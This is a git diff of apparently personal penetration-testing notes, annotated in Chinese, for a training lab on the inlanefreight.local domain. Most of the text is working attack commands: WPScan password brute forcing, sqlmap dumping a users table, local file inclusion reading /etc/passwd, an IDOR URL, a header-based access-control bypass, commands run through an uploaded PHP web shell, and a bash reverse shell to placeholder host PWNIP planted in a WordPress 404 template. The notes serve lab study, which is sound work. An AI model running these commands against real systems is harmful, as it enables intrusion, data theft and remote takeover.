@@ -103,11 +103,12 @@ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php
 sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local      枚举 WordPress 的插件
 curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd      mail-masta 插件的漏洞
 wpscan -e u -t 500 --url http://ir.inlanefreight.local      枚举用户
-wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp      爆破 ilfreightwp
-用 Burp 捕获 POST 请求，将其保存到文件 sqli.txt ，并用 * 标记 searchitem 参数
+wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp      爆破 ilfreightwp，用 Hydra 也行
+用 Burp 捕获 POST 请求，将其保存到文件 sqli.txt ，并用 * 标记 searchitem 参数，让 sqlmap 只在 searchitem 注入，sqlmap 默认检测所有参数（URL参数、POST数据、Cookie等）
 sqlmap -r sqli.txt --dbms=mysql      自动 SQL 攻击工具，sqli.txt 是一个 POST 完整请求
 sqlmap -r sqli.txt --dbms=mysql --dbs                    枚举数据库
 sqlmap -r sqli.txt --dbms=mysql -D status --tables      枚举 status 库里的表格
+sqlmap -r sqli.txt --dbms=mysql --dump -D status -T users --batch      dump 拉出 users 表格所有数据，batch 非交互式
 
 有工单提交网页
 在 Message 字段中包含以下内容，并提交工单
@@ -137,4 +138,18 @@ sudo php -S 0.0.0.0:9200      启动 php 网页服务
 插入一个简单的 JavaScript payload，如 <script>document.write('TESTING THIS')</script>，发现 JS 被执行，即 SSRF 漏洞，弱版 XSS
   https://appsecco.com/blog/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2
   https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f
+
+
+
+http://careers.inlanefreight.local/profile?id=4            IDOR
+
+change the request method from GET to TRACK, and add/inject the header X-Custom-IP-Authorization with 127.0.0.1          用 X-Custom-IP-Authorization: 127.0.0.1 模拟本地请求，进入管理功能 （后端逻辑放行127）
+curl -s http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat /var/www/html/flag.txt
+
+WordPress website
+add at the beginning in "404 Template" (404.php):
+exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
+sudo nc -nvlp PWNPO
+curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php
+
 
